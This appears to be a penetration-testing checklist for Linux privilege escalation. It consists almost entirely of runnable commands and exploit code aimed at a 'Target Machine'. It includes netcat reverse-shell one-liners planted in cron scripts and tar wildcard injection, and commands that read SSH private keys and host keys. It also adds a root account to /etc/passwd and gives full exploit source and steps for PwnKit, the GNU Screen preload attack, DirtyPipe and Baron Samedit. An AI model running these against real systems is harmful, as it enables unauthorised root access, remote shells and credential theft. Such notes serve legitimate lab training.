
# Dumb Shell

## Check for interactive shell
- [ ] Check if shell is a dumb shell on the Target Machine
```bash
tty
```
## Upgrade shell to be interactive
- [ ] Spawn a psuedo-terminal on the Target Machine
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
python2 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
python2.7 -c 'import pty; pty.spawn("/bin/bash")'
```
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- [ ] Spawn a terminal on the Target Machine
```bash
script -qc /bin/bash /dev/null
```

# Automated Enumeration

- [ ] List useful files
```
find / -name wget 2>/dev/null
find / -name nc* 2>/dev/null
find / -name netcat* 2>/dev/null
find / -name tftp* 2>/dev/null
find / -name ftp 2>/dev/null
find / -name curl 2>/dev/null
find / -name gcc 2>/dev/null
find / -name python 2>/dev/null
find / -name python2 2>/dev/null
find / -name python2.7 2>/dev/null
find / -name python3 2>/dev/null
```
```
which wget
which nc
which netcat
which tftp
which ftp
which curl
which gcc
which python
which python2
which python2.7
which python3
```

- [ ] Serve `linpeas` on your Kali Machine
```bash
cp /usr/share/peass/linpeas/linpeas.sh .
python3 -m http.server 80
```

- [ ] Download and run `linpeas` on the Target Machine
```bash
wget http://192.168.xxx.xxx/linpeas.sh
chmod a+x ./linpeas.sh
./linpeas.sh
```
- Try the suggested exploits from linux exploit suggester results

# AppArmor

- [ ] Verify AppArmor status on the Target Machine
```bash
su - root
aa-status
```

# Enumerate Operating System and Architecture

- [ ] List machine host name on the Target Machine
```bash
hostname
```

- [ ] List architecture on the Target Machine
```bash
arch
```

- [ ] List running Linux distribution type and version on the Target Machine
```bash
cat /etc/issue
```
```bash
cat /etc/debian_version
```
```bash
cat /etc/os-release
```
```bash
cat /etc/redhat-release
```
```bash
cat /etc/lsb-release
```
```bash
cat /etc/*-release
```
```bash
lsb_release -a
```

- [ ] List running Linux kernel version on the Target Machine
```bash
cat /proc/version
```
```bash
uname -a
```
```bash
rpm -q kernel
```
```bash
dmesg | grep Linux
```
```bash
ls /boot | grep vmlinuz-
```

# Enumerate Current User

- [ ] List current user identity on the Target Machine
```bash
id
```
```bash
whoami
```

- [ ] List current user groups on the Target Machine
```
groups thecurrentuser
```

- [ ] Inspect current user's sudo permissions on the Target Machine
```bash
sudo -l
```
- Consult GTFObins

- [ ] Inspect Environment Variables on the Target Machine
```bash
env
```
```bash
cat /etc/profile
```
```bash
cat /etc/bashrc
```
```bash
set
```

- [ ] Inspect dotfiles on the Target Machine
```bash
v
cat ~/.zsh_history
cat ~/.nano_history 
cat ~/.atftp_history 
cat ~/.mysql_history 
cat ~/.php_history
```
```bash
cat ~/.profile
cat ~/.bash_profile
cat ~/.zprofile
```
```bash
cat ~/.bashrc
cat ~/.zshrc
```
- Check for any permanent variables
- Check for any other information

# Enumerate users

View users on the Target Machine
```
ls -lah /home/
```

- [ ] List of local users on the Target Machine
```bash
cat /etc/passwd
```

- [ ] List of superusers on the Target Machine
```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'
```
```
awk -F: '($3 == "0") {print}' /etc/passwd
```

- [ ] List who else is logged in on the Target Machine
```
who -a
```

- [ ] List sudoers on the Target Machine
```
cat /etc/sudoers
```

# Enumerating Network Information

- [ ] List the TCP/IP configuration on the Target Machine
```bash
ifconfig
```
```bash
ip a
```

- [ ] List the network routes on the Target Machine
```bash
ip route
```
```bash
route
```
```bash
routel
```

- [ ] List cached IP/MAC Addresses on the Target Machine
```
arp -e
```

- [ ] List all active network connections on the Target Machine
```bash
ss -anp
```
```bash
netstat -anp
```

- [ ] List only TCP connections, UDP connections and listening ports on the Target Machine
```bash
ss -ntplu
```
```bash
netstat -ntplu
```

- [ ] List all sockets on the Target Machine
```bash
ss -ntpla
```
```bash
netstat -ntpla
```

- [ ] Inspect custom IP tables on the Target Machine
```bash
cat /etc/iptables/rules.v4
```

- [ ] Check the configured DNS server on the Target Machine
```bash
resolvectl status
```

- [ ] Manually explore service on every port on the Target Machine
```
nc 127.0.0.1 54321
```
```
telnet 127.0.0.1 54321
```
- Explore any "weird" ports or "unknown" services
- Use tunneling or port forwarding if needed

## Password Sniffing

- [ ] Start `tcpdump` to listen on TCP and UDP on all interfaces on the Target Machine
```bash
tcpdump -i any -vvv
```

# Enumerating Applications

- [ ] Reveal the SUID flag in the binary application on the Target Machine E.g., `passwd`
```bash
ls -asl /usr/bin/passwd
```

# Enumerating Processes

## pspy
- [ ] Serve `pspy64` on your Kali Machine
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
python3 -m http.server 80
```

- [ ] Download `pspy64` and snoop on processes on the Target Machine
```bash
wget http://192.168.xxx.xxx/pspy64
chmod a+x ./pspy64
./pspy64
```
- Able to catch secrets as arguments on the command line

## Bash
List open files
```
lsof -i
```

- [ ] List running processes on Linux on the Target Machine
```bash
ps aux
```

Getting a list of processes running as root on Linux on the Target Machine
```bash
ps auxf | grep -i 'root' --color=auto
```

- [ ] Refresh output of a command for monitoring on the Target Machine E.g., `ps`
```bash
watch -n 1 "ps -aux"
```
```bash
watch -n 1 "ps -aux | grep pass"
```
- Possible to harvest active processes for credentials

- [ ] Inspect process credentials on the Target Machine E.g., `passwd`
```bash
ps u -C passwd
```

- [ ] Inspect the real UID and effective UID assigned for the process by inspecting the proc pseudo-filesystem on the Target Machine
```bash
grep Uid /proc/1969/status
```
```bash
cat /proc/1337/status | grep Uid
```

- [ ] List configuration files on the Target Machine
```bash
ls /etc/*.conf
```
- Check for misconfigured settings

# Enumerating Packages

- [ ] List all installed packages on the Target Linux Machine
```bash
dpkg -l
```
```bash
rpm -qa
```
```bash
ls -lah /usr/bin/
```
```bash
ls -lah /sbin/
```

# Enumerating Scheduled Jobs

- [ ] Inspect log files for "cron" on the Target Machine
```bash
grep "CRON" /var/log/syslog
```
- Try with other log files
	- `ls /var/log`

- [ ] List all `cron` jobs on the Target Machine
```bash
ls -lah /etc/cron*
```

- [ ] View `crontab` on the Target Machine
```bash
cat /etc/crontab
```

- [ ] List `cron` jobs for the current user on the Target Machine
```bash
crontab -l
```

- [ ] List `cron` jobs for the root user on the Target Machine
```bash
sudo crontab -l
```

- [ ] Add a Reverse Shell One-Liner to a Cron Scheduled Script on the Target Machine
```bash
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.xxx.xxx 1234 >/tmp/f" >> some_scheduled_script.sh
```
# Enumerating Files and Directories

- [ ] Manually list files on the Target Machine
```bash
ls -lah /var/lib/
ls -lah /var/db/
ls -lah /var/tmp/
ls -lah /opt/
ls -lah /tmp/
ls -lah /dev/shm/
```

- [ ] Check for default SSH files in default SSH folder on the Target Machine
```bash
cat /home/user/.ssh/id_rsa
cat /home/user/.ssh/id_rsa.pub
cat /home/user/.ssh/id_ecdsa
cat /home/user/.ssh/id_ecdsa_sk
cat /home/user/.ssh/id_ed25519
cat /home/user/.ssh/id_ed25519_sk
cat /home/user/.ssh/id_dsa
cat /home/user/.ssh/id_dsa.pub
cat /home/user/.ssh/identity
cat /home/user/.ssh/identity.pub
cat /home/user/.ssh/authorized_keys
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
```

- [ ] View log files in the `/var/log` directory on the Target Machine
```bash
ls -lah /var/log 
```

- [ ] Inspecting file permissions and users ownership on the Target Machine
```bash
ls -l /etc/passwd
```

- [ ] Escalating privileges by editing `/etc/passwd` on the Target Machine
```bash
openssl passwd w00t
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
```

- [ ] List all world writable directories on the Target Machine
```bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
find / -perm -o w -type d 2>/dev/null
```

- [ ] List all world writable files on the Target Machine
```bash
find / -writable -type f 2>/dev/null
```

- [ ] List all world executable directories on the Target Machine
```bash
find / -perm -o x -type d 2>/dev/null
```

- [ ] Search for SUID files on the Target Machine
```bash
find / -perm -u=s -type f 2>/dev/null
```
```bash
find / -perm -4000 2>/dev/null
```
- Consult GTFObins

- [ ] Search for GUID files on the Target Machine
```bash
find / -perm -g=s -type f 2>/dev/null
```
- Consult GTFObins

- [ ] List Linux Capabilities on the Target Machine
```bash
/usr/sbin/getcap -r / 2>/dev/null
```
- Consult GTFObins

# Enumerate Drives

- [ ] List content of `/etc/fstab` and all mounted drives on the Target Machine
```bash
cat /etc/fstab
mount
```

- [ ] List all available drives on the Target Machine
```bash
lsblk
```

# Enumerate Drivers

- [ ] List loaded drivers on the Target Machine
```bash
lsmod
```

# Login as user

- [ ] Switch user on the Target Machine
```bash
su - <user>
su - <user>
```
- Attempt with password or hash (Sometimes passwords may look like hashes)
- External logins may sometimes fail although credentials are correct (E.g., SSH)

# Possible Escalation Exploits

## PwnKit (CVE-2021-4034)

Create `evil-so.c` on the Target Machine
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void gconv() {}

void gconv_init() {
    setuid(0);
    setgid(0);
    setgroups(0);
    execve("/bin/sh", NULL, NULL);
}
```

Create `exploit.c` on the Target Machine
```c
#include <stdio.h>
#include <stdlib.h>

#define BIN "/usr/bin/pkexec"
#define DIR "evildir"
#define EVILSO "evil"

int main()
{
    char *envp[] = {
        DIR,
        "PATH=GCONV_PATH=.",
        "SHELL=ryaagard",
        "CHARSET=ryaagard",
        NULL
    };
    char *argv[] = { NULL };
    
    system("mkdir GCONV_PATH=.");
    system("touch GCONV_PATH=./" DIR " && chmod 777 GCONV_PATH=./" DIR);
    system("mkdir " DIR);
    system("echo 'module\tINTERNAL\t\t\tryaagard//\t\t\t" EVILSO "\t\t\t2' > " DIR "/gconv-modules");
    system("cp " EVILSO ".so " DIR);
    
    execve(BIN, argv, envp);
    
    return 0;
}
```

- [ ] Compile the binaries on the Target Machine
```bash
gcc -shared -o evil.so -fPIC evil-so.c
gcc exploit.c -o exploit
```

- [ ] Make the binary executable on the Target Machine
```
chmod 777 exploit
```

- [ ] Run exploit on the Target Machine
```bash
./exploit
```

## Baron Samedit sudo heap based buffer overflow  (CVE-2021-3156)

- [ ] Download exploit on your Kali Machine
```
wget https://codeload.github.com/blasty/CVE-2021-3156/zip/main
```

- [ ] Serve file with python web server on your Kali Machine
```bash
python3 -m http.server 80
```

- [ ] Download file on the Target Machine
```
wget http://192.168.xxx.xxx:80/main.zip
```

- [ ] Un-compress file on the Target Machine
```
unzip main
```

- [ ] Compile binary on the Target Machine
```
cd CVE-2021-3156-main
make
```

- [ ] Make the binary executable on the Target Machine
```
chmod 777 sudo-hax-me-a-sandwich
```

- [ ] Run exploit on the Target Machine
```
./sudo-hax-me-a-sandwich 0
./sudo-hax-me-a-sandwich 1
./sudo-hax-me-a-sandwich 2
```

## GNU Screen 4.5.0 - Local Privilege Escalation (CVE-2017-5618)

- [ ] Download exploit on your Kali Machine
```
searcsploit -x 41154
```
- This is for reference, we will do it manually

- [ ] Clone the XenSpawn repo locally on your Kali Machine
```
git clone https://github.com/X0RW3LL/XenSpawn.git
cd XenSpawn/
```
- XenSpawn is used to build an Ubuntu 16.04 LTS (Xenial Xerus) system

- [ ] Make the script executable and run script as root on your Kali Machine
```
chmod +x spawn.sh
sudo ./spawn.sh testmachine1
```

- [ ] Start the newly spawned container on your Kali Machine
```
sudo systemd-nspawn -M testmachine1
```

- [ ] Create `libhax.c` in the container on your Kali Machine
```
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
```

- [ ] Compile `libhax.c` to `libhax.so` in the container on your Kali Machine
```
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
```

- [ ] Create `rootshell.c` in the container on your Kali Machine
```
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
```

- [ ] Compile `rootshell.c` to `rootshell.c` in the container on your Kali Machine
```
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
```

- [ ] Move files to root in the container to be copied out into your Kali Machine
```
cd /root
cp /tmp/libhax.so .
cp /tmp/rootshell .
```

- [ ] Copy out the files onto your Kali Machine
```
sudo cp /var/lib/machines/testmachine1/root/libhax.so .
sudo cp /var/lib/machines/testmachine1/root/rootshell .
```

- [ ] Exit container on your Kali Machine
```
exit
logout
```

- [ ] Serve file with a python web server on your Kali Machine
```bash
python3 -m http.server 80
```

- [ ] Download files in the `/tmp` directory on the Target Machine
```
cd /tmp
wget http://192.168.xxx.xxx:80/libhax.so
wget http://192.168.xxx.xxx:80/rootshell
```

- [ ] Check permission rights of our files on the Target Machine
```
ls -lah /tmp/libhax.so
ls -lah /tmp/rootshell
```
- Note that the owner is our current user

- [ ] Navigate to `/etc` directory on the Target Machine
```
cd /etc
```

- [ ] Make newly created directories with all permissions for everyone on the Target Machine
```
umask 000
```

- [ ] Create our `/etc/ld.so.preload` file on the Target Machine
```
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
```
- `-L` creates a log file named `ld.so.preload`
	- This specifies libraries to use before the default libraries are used
	- We write our own library (`libhax.so`) to the log file
- Low priv users cannot create new files in `/etc` but we used `screen` to create it for us

- [ ] Ensure preload file is created on the Target Machine
```
ls -l ld.so.preload
```

- [ ] View that ownership of `rootshell` has become root on the Target Machine
```
ls -l /tmp/rootshell
```

- [ ] Run screen to run the library with our commands on the Target Machine
```
screen -ls 
```

- [ ] Run `rootshell` to get a root shell on the Target Machine
```
/tmp/rootshell
```

## DirtyPipe (CVE-2022-0847)

- [ ] Download dirtyPipe vulnerability checker and serve on your Kali Machine
```
wget https://raw.githubusercontent.com/basharkey/CVE-2022-0847-dirty-pipe-checker/main/dpipe.sh
python3 -m http.server 80
```

- [ ] Download file on the Target Machine
```
wget 192.168.xxx.xxx/dpipe.sh
```

- [ ] Run vulnerability checker on the Target Machine
```
chmod +x dpipe.sh 
./dpipe.sh
```

- [ ] Clone repo for dirtypipe and serve on your Kali Machine
```
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
python3 -m http.server 80
```

- [ ] Download files on the Target Machine
```
wget 192.168.xxx.xxx/compile.sh
wget 192.168.xxx.xxx/exploit-1.c
wget 192.168.xxx.xxx/exploit-2.c
```

- [ ] Compile exploit on the Target Machine
```
chmod +x compile.sh
./compile.sh
```

- [ ] Run `exploit-1` on the Target Machine
```
./exploit-1
```

- [ ] Run `exploit-2` on the Target Machine
```
./exploit-2 /usr/bin/sudo
```

## subuid_shell (CVE-2018-18955)

- [ ] Download appropriate binaries and serve on your Kali Machine
```
https://github.com/scheatkode/CVE-2018-18955/releases/tag/v0.0.1
python3 -m http.server 80
```
- I used [linux-x86_64.tar.gz](https://github.com/scheatkode/CVE-2018-18955/releases/download/v0.0.1/linux-x86_64.tar.gz)

- [ ] Transfer to the Target Machine
```
wget 192.168.xxx.xxx/linux-x86_64.tar.gz
tar -xvf linux-x86_64.tar.gz
cd linux-x86_64/bin
```

- [ ] Run exploit on the Target Machine
```
chmod 777 subuid_shell
./subuid_shell
```
- Try the other binaries in the zip file if this doesn't work

## Unix Wildcard Injection
> Can be used if cronjob or binary is run by root

### Tar Wildcard Injection

- [ ] Check for `tar` wildcard `cron` job run as root on the Target Machine
```
ls -lah /etc/cron*
```
Examples:
- `sudo tar -cf example.tar *`
- `tar cf archive.tar *`
- `tar -zxf /tmp/backup.tar.gz *`

- [ ] Generate a `nc` reverse shell payload using `msfvenom` on your Kali Machine
```
msfvenom -p cmd/unix/reverse_netcat lhost=192.168.xxx.xxx lport=8888 R
```

- [ ] Navigate to the directory that the `cronjob` will run `tar` with a wildcard and create the 3 exploit files on the Target Machine
```
echo "mkfifo /tmp/fgbepo; nc 192.168.xxx.xxx 8888 0</tmp/fgbepo | /bin/sh >/tmp/fgbepo 2>&1; rm /tmp/fgbepo" > shell.sh
echo "" > --checkpoint=1 
echo "" > "--checkpoint-action=exec=sh shell.sh" 
```
- Running `tar cf archive.tar *` now will be giving a reverse shell as the current user

- [ ] Get reverse shell

